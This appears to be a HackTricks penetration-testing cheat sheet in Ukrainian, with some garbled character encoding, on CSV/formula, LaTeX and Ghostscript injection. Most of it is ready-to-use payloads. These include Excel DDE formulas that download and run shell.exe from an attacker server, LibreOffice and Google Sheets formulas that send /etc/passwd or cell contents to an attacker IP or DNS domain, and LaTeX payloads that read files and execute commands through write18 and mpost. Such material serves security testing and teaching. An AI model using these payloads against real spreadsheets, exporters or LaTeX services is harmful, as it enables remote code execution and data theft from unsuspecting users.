# Formula/CSV/Doc/LaTeX/GhostScript Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Formula Injection

### Info

–Ø–∫—â–æ –≤–∞—à **–≤—Ö—ñ–¥** –≤—ñ–¥–æ–±—Ä–∞–∂–∞—î—Ç—å—Å—è –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ **CSV —Ñ–∞–π–ª—ñ–≤** (–∞–±–æ –±—É–¥—å-—è–∫–æ–≥–æ —ñ–Ω—à–æ–≥–æ —Ñ–∞–π–ª—É, —è–∫–∏–π, –π–º–æ–≤—ñ—Ä–Ω–æ, –±—É–¥–µ –≤—ñ–¥–∫—Ä–∏—Ç–∏–π –≤ **Excel**), –≤–∏, –º–æ–∂–ª–∏–≤–æ, –∑–º–æ–∂–µ—Ç–µ –≤—Å—Ç–∞–≤–∏—Ç–∏ **—Ñ–æ—Ä–º—É–ª–∏** Excel, —è–∫—ñ –±—É–¥—É—Ç—å **–≤–∏–∫–æ–Ω–∞–Ω—ñ**, –∫–æ–ª–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á **–≤—ñ–¥–∫—Ä–∏–≤–∞—î —Ñ–∞–π–ª** –∞–±–æ –∫–æ–ª–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á **–Ω–∞—Ç–∏—Å–∫–∞—î –Ω–∞ –¥–µ—è–∫–µ –ø–æ—Å–∏–ª–∞–Ω–Ω—è** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∞—Ä–∫—É—à–∞ Excel.

{% hint style="danger" %}
–°—å–æ–≥–æ–¥–Ω—ñ **Excel –ø–æ–ø–µ—Ä–µ–¥–∏—Ç—å** (–¥–µ–∫—ñ–ª—å–∫–∞ —Ä–∞–∑—ñ–≤) **–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –∫–æ–ª–∏ —â–æ—Å—å –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î—Ç—å—Å—è –∑–∑–æ–≤–Ω—ñ Excel**, —â–æ–± –∑–∞–ø–æ–±—ñ–≥—Ç–∏ –π–æ–º—É –≤—ñ–¥ –∑–ª–æ—á–∏–Ω–Ω–∏—Ö –¥—ñ–π. –¢–æ–º—É –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ –¥–æ–∫–ª–∞—Å—Ç–∏ –æ—Å–æ–±–ª–∏–≤–∏—Ö –∑—É—Å–∏–ª—å —É —Å–æ—Ü—ñ–∞–ª—å–Ω–æ–º—É —ñ–Ω–∂–µ–Ω–µ—Ä—ñ—ó –¥–ª—è —Ñ—ñ–Ω–∞–ª—å–Ω–æ–≥–æ payload.
{% endhint %}

### [Wordlist](https://github.com/payloadbox/csv-injection-payloads)
```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```
### Hyperlink

**–ù–∞—Å—Ç—É–ø–Ω–∏–π –ø—Ä–∏–∫–ª–∞–¥ —î –¥—É–∂–µ –∫–æ—Ä–∏—Å–Ω–∏–º –¥–ª—è –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó –≤–º—ñ—Å—Ç—É –∑ —Ñ—ñ–Ω–∞–ª—å–Ω–æ—ó —Ç–∞–±–ª–∏—Ü—ñ Excel —Ç–∞ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∑–∞–ø–∏—Ç—ñ–≤ –¥–æ –¥–æ–≤—ñ–ª—å–Ω–∏—Ö –º—ñ—Å—Ü—å. –ê–ª–µ —Ü–µ –≤–∏–º–∞–≥–∞—î, —â–æ–± –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –Ω–∞—Ç–∏—Å–Ω—É–≤ –Ω–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è (—ñ –ø—Ä–∏–π–Ω—è–≤ –ø–æ–ø–µ—Ä–µ–¥–∂–µ–Ω–Ω—è).**

–ù–∞—Å—Ç—É–ø–Ω–∏–π –ø—Ä–∏–∫–ª–∞–¥ –±—É–≤ –≤–∑—è—Ç–∏–π –∑ [https://payatu.com/csv-injection-basic-to-exploit](https://payatu.com/csv-injection-basic-to-exploit)

–£—è–≤—ñ—Ç—å, —â–æ —É —Å–∏—Å—Ç–µ–º—ñ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –∑–∞–ø–∏—Å–∞–º–∏ —Å—Ç—É–¥–µ–Ω—Ç—ñ–≤ —Å—Ç–∞–ª–∞—Å—è –≤–∏—Ç—ñ–∫ –±–µ–∑–ø–µ–∫–∏, —è–∫–∏–π –±—É–≤ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π —á–µ—Ä–µ–∑ –∞—Ç–∞–∫—É CSV injection. –û—Å–Ω–æ–≤–Ω–∞ –º–µ—Ç–∞ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞ - —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ —Å–∏—Å—Ç–µ–º—É, —è–∫—É –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å –≤—á–∏—Ç–µ–ª—ñ –¥–ª—è —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –¥–∞–Ω–∏–º–∏ —Å—Ç—É–¥–µ–Ω—Ç—ñ–≤. –ú–µ—Ç–æ–¥ –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –≤–≤–æ–¥–∏—Ç—å —à–∫—ñ–¥–ª–∏–≤–∏–π –∫–æ–¥ —É –¥–æ–¥–∞—Ç–æ–∫, –∑–æ–∫—Ä–µ–º–∞, –≤–≤–æ–¥—è—á–∏ —à–∫—ñ–¥–ª–∏–≤—ñ —Ñ–æ—Ä–º—É–ª–∏ —É –ø–æ–ª—è, –ø—Ä–∏–∑–Ω–∞—á–µ–Ω—ñ –¥–ª—è –¥–∞–Ω–∏—Ö —Å—Ç—É–¥–µ–Ω—Ç—ñ–≤. –ê—Ç–∞–∫–∞ —Ä–æ–∑–≥–æ—Ä—Ç–∞—î—Ç—å—Å—è –Ω–∞—Å—Ç—É–ø–Ω–∏–º —á–∏–Ω–æ–º:

1. **–í–≤–µ–¥–µ–Ω–Ω—è —à–∫—ñ–¥–ª–∏–≤–æ–≥–æ –∫–æ–¥—É:**
* –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –ø–æ–¥–∞—î —Ñ–æ—Ä–º—É –¥–∞–Ω–∏—Ö —Å—Ç—É–¥–µ–Ω—Ç–∞, –∞–ª–µ –≤–∫–ª—é—á–∞—î —Ñ–æ—Ä–º—É–ª—É, —è–∫–∞ –∑–∞–∑–≤–∏—á–∞–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤ –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–∏—Ö —Ç–∞–±–ª–∏—Ü—è—Ö (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `=HYPERLINK("<malicious_link>","Click here")`).
* –¶—è —Ñ–æ—Ä–º—É–ª–∞ –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∞ –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –≥—ñ–ø–µ—Ä–ø–æ—Å–∏–ª–∞–Ω–Ω—è, –∞–ª–µ –≤–æ–Ω–∞ –≤–∫–∞–∑—É—î –Ω–∞ —à–∫—ñ–¥–ª–∏–≤–∏–π —Å–µ—Ä–≤–µ—Ä, –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–∏–π –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–æ–º.
2. **–ï–∫—Å–ø–æ—Ä—Ç —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–∏—Ö –¥–∞–Ω–∏—Ö:**
* –í—á–∏—Ç–µ–ª—ñ, –Ω–µ –ø—ñ–¥–æ–∑—Ä—é—é—á–∏ –ø—Ä–æ –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü—ñ—é, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å –¥–æ–¥–∞—Ç–∫–∞ –¥–ª—è –µ–∫—Å–ø–æ—Ä—Ç—É –¥–∞–Ω–∏—Ö —É —Ñ–∞–π–ª CSV.
* –§–∞–π–ª CSV, –∫–æ–ª–∏ –π–æ–≥–æ –≤—ñ–¥–∫—Ä–∏–≤–∞—é—Ç—å, –≤—Å–µ —â–µ –º—ñ—Å—Ç–∏—Ç—å —à–∫—ñ–¥–ª–∏–≤–∏–π –∫–æ–¥. –¶–µ–π –∫–æ–¥ –∑'—è–≤–ª—è—î—Ç—å—Å—è —è–∫ –∫–ª—ñ–∫–∞–±–µ–ª—å–Ω–µ –≥—ñ–ø–µ—Ä–ø–æ—Å–∏–ª–∞–Ω–Ω—è –≤ –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω—ñ–π —Ç–∞–±–ª–∏—Ü—ñ.
3. **–ê–∫—Ç–∏–≤–∞—Ü—ñ—è –∞—Ç–∞–∫–∏:**
* –í—á–∏—Ç–µ–ª—å –Ω–∞—Ç–∏—Å–∫–∞—î –Ω–∞ –≥—ñ–ø–µ—Ä–ø–æ—Å–∏–ª–∞–Ω–Ω—è, –≤–≤–∞–∂–∞—é—á–∏ –π–æ–≥–æ –ª–µ–≥—ñ—Ç–∏–º–Ω–æ—é —á–∞—Å—Ç–∏–Ω–æ—é –¥–∞–Ω–∏—Ö —Å—Ç—É–¥–µ–Ω—Ç–∞.
* –ü—ñ—Å–ª—è –Ω–∞—Ç–∏—Å–∫–∞–Ω–Ω—è —á—É—Ç–ª–∏–≤—ñ –¥–∞–Ω—ñ (–º–æ–∂–ª–∏–≤–æ, –≤–∫–ª—é—á–∞—é—á–∏ –¥–µ—Ç–∞–ª—ñ –∑ –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ—ó —Ç–∞–±–ª–∏—Ü—ñ –∞–±–æ –∫–æ–º–ø'—é—Ç–µ—Ä–∞ –≤—á–∏—Ç–µ–ª—è) –ø–µ—Ä–µ–¥–∞—é—Ç—å—Å—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞.
4. **–õ–æ–≥—É–≤–∞–Ω–Ω—è –¥–∞–Ω–∏—Ö:**
* –°–µ—Ä–≤–µ—Ä –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞ –æ—Ç—Ä–∏–º—É—î —Ç–∞ —Ä–µ—î—Å—Ç—Ä—É—î —á—É—Ç–ª–∏–≤—ñ –¥–∞–Ω—ñ, –Ω–∞–¥—ñ—Å–ª–∞–Ω—ñ –∑ –∫–æ–º–ø'—é—Ç–µ—Ä–∞ –≤—á–∏—Ç–µ–ª—è.
* –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –ø–æ—Ç—ñ–º –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü—ñ –¥–∞–Ω—ñ –¥–ª—è —Ä—ñ–∑–Ω–∏—Ö —à–∫—ñ–¥–ª–∏–≤–∏—Ö —Ü—ñ–ª–µ–π, —â–µ –±—ñ–ª—å—à–µ –∫–æ–º–ø—Ä–æ–º–µ—Ç—É—é—á–∏ –∫–æ–Ω—Ñ—ñ–¥–µ–Ω—Ü—ñ–π–Ω—ñ—Å—Ç—å —ñ –±–µ–∑–ø–µ–∫—É —Å—Ç—É–¥–µ–Ω—Ç—ñ–≤ —Ç–∞ —É—Å—Ç–∞–Ω–æ–≤–∏.

### RCE

**–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ** [**–æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏–π –ø–æ—Å—Ç**](https://notsosecure.com/data-exfiltration-formula-injection-part1) **–¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–∏—Ö –¥–µ—Ç–∞–ª–µ–π.**

–£ —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω–∏—Ö –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è—Ö –∞–±–æ —Å—Ç–∞—Ä—ñ—à–∏—Ö –≤–µ—Ä—Å—ñ—è—Ö Excel —Ñ—É–Ω–∫—Ü—ñ—è, –∑–≤–∞–Ω–∏–π –î–∏–Ω–∞–º—ñ—á–Ω–∏–π –æ–±–º—ñ–Ω –¥–∞–Ω–∏–º–∏ (DDE), –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∞ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–∏—Ö –∫–æ–º–∞–Ω–¥. –©–æ–± —Å–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏—Å—è —Ü–∏–º, –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ –∞–∫—Ç–∏–≤—É–≤–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—ñ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è:

* –ü–µ—Ä–µ–π–¥—ñ—Ç—å –¥–æ –§–∞–π–ª ‚Üí –ü–∞—Ä–∞–º–µ—Ç—Ä–∏ ‚Üí –¶–µ–Ω—Ç—Ä —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –±–µ–∑–ø–µ–∫–æ—é ‚Üí –ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –¶–µ–Ω—Ç—Ä—É —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –±–µ–∑–ø–µ–∫–æ—é ‚Üí –ó–æ–≤–Ω—ñ—à–Ω—ñ–π –≤–º—ñ—Å—Ç, —ñ –∞–∫—Ç–∏–≤—É–π—Ç–µ **–ó–∞–ø—É—Å–∫ —Å–µ—Ä–≤–µ—Ä–∞ –¥–∏–Ω–∞–º—ñ—á–Ω–æ–≥–æ –æ–±–º—ñ–Ω—É –¥–∞–Ω–∏–º–∏**.

–ö–æ–ª–∏ –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–∞ —Ç–∞–±–ª–∏—Ü—è –∑ —à–∫—ñ–¥–ª–∏–≤–∏–º –∫–æ–¥–æ–º –≤—ñ–¥–∫—Ä–∏–≤–∞—î—Ç—å—Å—è (—ñ —è–∫—â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –ø—Ä–∏–π–º–∞—î –ø–æ–ø–µ—Ä–µ–¥–∂–µ–Ω–Ω—è), –∫–æ–¥ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —â–æ–± –∑–∞–ø—É—Å—Ç–∏—Ç–∏ –ø—Ä–æ–≥—Ä–∞–º—É –∫–∞–ª—å–∫—É–ª—è—Ç–æ—Ä–∞, –∫–æ–¥ –±—É–¥–µ:
```markdown
=cmd|' /C calc'!xxx
```
–î–æ–¥–∞—Ç–∫–æ–≤—ñ –∫–æ–º–∞–Ω–¥–∏ —Ç–∞–∫–æ–∂ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω—ñ, —Ç–∞–∫—ñ —è–∫ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ç–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ñ–∞–π–ª—É –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é PowerShell:
```bash
=cmd|' /C powershell Invoke-WebRequest "http://www.attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
```
### Local File Inclusion (LFI) in LibreOffice Calc

LibreOffice Calc –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è —á–∏—Ç–∞–Ω–Ω—è –ª–æ–∫–∞–ª—å–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤ —Ç–∞ –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó –¥–∞–Ω–∏—Ö. –û—Å—å –∫—ñ–ª—å–∫–∞ –º–µ—Ç–æ–¥—ñ–≤:

* –ß–∏—Ç–∞–Ω–Ω—è –ø–µ—Ä—à–æ–≥–æ —Ä—è–¥–∫–∞ –∑ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ —Ñ–∞–π–ª—É `/etc/passwd`: `='file:///etc/passwd'#$passwd.A1`
* –ï–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—è –ø—Ä–æ—á–∏—Ç–∞–Ω–∏—Ö –¥–∞–Ω–∏—Ö –Ω–∞ —Å–µ—Ä–≤–µ—Ä, –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–∏–π –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–æ–º: `=WEBSERVICE(CONCATENATE("http://<attacker IP>:8080/",('file:///etc/passwd'#$passwd.A1)))`
* –ï–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—è –±—ñ–ª—å—à–µ –Ω—ñ–∂ –æ–¥–Ω–æ–≥–æ —Ä—è–¥–∫–∞: `=WEBSERVICE(CONCATENATE("http://<attacker IP>:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))`
* DNS –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—è (–≤—ñ–¥–ø—Ä–∞–≤–∫–∞ –ø—Ä–æ—á–∏—Ç–∞–Ω–∏—Ö –¥–∞–Ω–∏—Ö —è–∫ DNS –∑–∞–ø–∏—Ç–∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä DNS, –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–∏–π –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–æ–º): `=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),".<attacker domain>"))`

### Google Sheets for Out-of-Band (OOB) Data Exfiltration

Google Sheets –ø—Ä–æ–ø–æ–Ω—É—î —Ñ—É–Ω–∫—Ü—ñ—ó, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è OOB –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó –¥–∞–Ω–∏—Ö:

* **CONCATENATE**: –û–±'—î–¥–Ω—É—î —Ä—è–¥–∫–∏ - `=CONCATENATE(A2:E2)`
* **IMPORTXML**: –Ü–º–ø–æ—Ä—Ç—É—î –¥–∞–Ω—ñ –∑ —Å—Ç—Ä—É–∫—Ç—É—Ä–æ–≤–∞–Ω–∏—Ö —Ç–∏–ø—ñ–≤ –¥–∞–Ω–∏—Ö - `=IMPORTXML(CONCAT("http://<attacker IP:Port>/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")`
* **IMPORTFEED**: –Ü–º–ø–æ—Ä—Ç—É—î RSS –∞–±–æ ATOM —Å—Ç—Ä—ñ—á–∫–∏ - `=IMPORTFEED(CONCAT("http://<attacker IP:Port>//123.txt?v=", CONCATENATE(A2:E2)))`
* **IMPORTHTML**: –Ü–º–ø–æ—Ä—Ç—É—î –¥–∞–Ω—ñ –∑ HTML —Ç–∞–±–ª–∏—Ü—å –∞–±–æ —Å–ø–∏—Å–∫—ñ–≤ - `=IMPORTHTML (CONCAT("http://<attacker IP:Port>/123.txt?v=", CONCATENATE(A2:E2)),"table",1)`
* **IMPORTRANGE**: –Ü–º–ø–æ—Ä—Ç—É—î –¥—ñ–∞–ø–∞–∑–æ–Ω –∫–ª—ñ—Ç–∏–Ω–æ–∫ –∑ —ñ–Ω—à–æ—ó —Ç–∞–±–ª–∏—Ü—ñ - `=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")`
* **IMAGE**: –í—Å—Ç–∞–≤–ª—è—î –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è –≤ –∫–ª—ñ—Ç–∏–Ω–∫—É - `=IMAGE("https://<attacker IP:Port>/images/srpr/logo3w.png")`

## LaTeX Injection

–ó–∞–∑–≤–∏—á–∞–π —Å–µ—Ä–≤–µ—Ä–∏, —è–∫—ñ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –≤ —ñ–Ω—Ç–µ—Ä–Ω–µ—Ç—ñ, —â–æ **–ø–µ—Ä–µ—Ç–≤–æ—Ä—é—é—Ç—å LaTeX –∫–æ–¥ –Ω–∞ PDF**, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å **`pdflatex`**.\
–¶—è –ø—Ä–æ–≥—Ä–∞–º–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î 3 –æ—Å–Ω–æ–≤–Ω—ñ –∞—Ç—Ä–∏–±—É—Ç–∏ –¥–ª—è (–Ω–µ)–¥–æ–∑–≤–æ–ª—É –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–º–∞–Ω–¥:

* **`--no-shell-escape`**: **–í–∏–º–∫–Ω—É—Ç–∏** –∫–æ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—é `\write18{command}`, –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ –≤–æ–Ω–∞ —É–≤—ñ–º–∫–Ω–µ–Ω–∞ —É —Ñ–∞–π–ª—ñ texmf.cnf.
* **`--shell-restricted`**: –¢–µ –∂ —Å–∞–º–µ, —â–æ —ñ `--shell-escape`, –∞–ª–µ **–æ–±–º–µ–∂–µ–Ω–æ** –¥–æ '–±–µ–∑–ø–µ—á–Ω–æ–≥–æ' –Ω–∞–±–æ—Ä—É **–ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ –≤–∏–∑–Ω–∞—á–µ–Ω–∏—Ö** \*\*–∫–æ–º–∞–Ω–¥ (\*\*–ù–∞ Ubuntu 16.04 —Å–ø–∏—Å–æ–∫ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ `/usr/share/texmf/web2c/texmf.cnf`).
* **`--shell-escape`**: **–£–≤—ñ–º–∫–Ω—É—Ç–∏** –∫–æ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—é `\write18{command}`. –ö–æ–º–∞–Ω–¥–∞ –º–æ–∂–µ –±—É—Ç–∏ –±—É–¥—å-—è–∫–æ—é –∫–æ–º–∞–Ω–¥–æ—é –æ–±–æ–ª–æ–Ω–∫–∏. –¶—è –∫–æ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—è –∑–∞–∑–≤–∏—á–∞–π –∑–∞–±–æ—Ä–æ–Ω–µ–Ω–∞ –∑ –º—ñ—Ä–∫—É–≤–∞–Ω—å –±–µ–∑–ø–µ–∫–∏.

–û–¥–Ω–∞–∫ —î –π —ñ–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–º–∞–Ω–¥, —Ç–æ–º—É, —â–æ–± —É–Ω–∏–∫–Ω—É—Ç–∏ RCE, –¥—É–∂–µ –≤–∞–∂–ª–∏–≤–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ `--shell-restricted`.

### Read file <a href="#read-file" id="read-file"></a>

–í–∞–º –º–æ–∂–µ –∑–Ω–∞–¥–æ–±–∏—Ç–∏—Å—è –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ —ñ–Ω'—î–∫—Ü—ñ—é –∑ –æ–±–≥–æ—Ä—Ç–∫–∞–º–∏, —Ç–∞–∫–∏–º–∏ —è–∫ \[ –∞–±–æ $.
```bash
\input{/etc/passwd}
\include{password} # load .tex file
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```
#### –ü—Ä–æ—á–∏—Ç–∞—Ç–∏ —Ñ–∞–π–ª –∑ –æ–¥–Ω–æ–≥–æ —Ä—è–¥–∫–∞
```bash
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```
#### –ß–∏—Ç–∞–Ω–Ω—è —Ñ–∞–π–ª—É –∑ –∫—ñ–ª—å–∫–æ–º–∞ —Ä—è–¥–∫–∞–º–∏
```bash
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
\read\file to\fileline
\text{\fileline}
\repeat
\closein\file
```
### –ó–∞–ø–∏—Å–∞—Ç–∏ —Ñ–∞–π–ª <a href="#write-file" id="write-file"></a>
```bash
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```
### –í–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–º–∞–Ω–¥ <a href="#command-execution" id="command-execution"></a>

–í—Ö—ñ–¥–Ω—ñ –¥–∞–Ω—ñ –∫–æ–º–∞–Ω–¥–∏ –±—É–¥—É—Ç—å –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω—ñ –¥–æ stdin, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ —Ç–∏–º—á–∞—Å–æ–≤–∏–π —Ñ–∞–π–ª, —â–æ–± —ó—Ö –æ—Ç—Ä–∏–º–∞—Ç–∏.
```bash
\immediate\write18{env > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# If mpost is not allowed there are other commands you might be able to execute
## Just get the version
\input{|"bibtex8 --version > /tmp/b.tex"}
## Search the file pdfetex.ini
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
## Get env var value
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
## Get the value of shell_escape_commands without needing to read pdfetex.ini
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```
–Ø–∫—â–æ –≤–∏ –æ—Ç—Ä–∏–º–∞—î—Ç–µ –±—É–¥—å-—è–∫—É –ø–æ–º–∏–ª–∫—É LaTex, —Ä–æ–∑–≥–ª—è–Ω—å—Ç–µ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è base64, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ —Ä–µ–∑—É–ª—å—Ç–∞—Ç –±–µ–∑ –ø–æ–≥–∞–Ω–∏—Ö —Å–∏–º–≤–æ–ª—ñ–≤.
```bash
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```bash
\input|ls|base4
\input{|"/bin/hostname"}
```
### Cross Site Scripting <a href="#cross-site-scripting" id="cross-site-scripting"></a>

–í—ñ–¥ [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)
```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```
## Ghostscript Injection

**–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ** [**https://blog.redteam-pentesting.de/2023/ghostscript-overview/**](https://blog.redteam-pentesting.de/2023/ghostscript-overview/)

## References

* [https://notsosecure.com/data-exfiltration-formula-injection-part1](https://notsosecure.com/data-exfiltration-formula-injection-part1)
* [https://0day.work/hacking-with-latex/](https://0day.work/hacking-with-latex/)
* [https://salmonsec.com/cheatsheet/latex\_injection](https://salmonsec.com/cheatsheet/latex\_injection)
* [https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)


{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
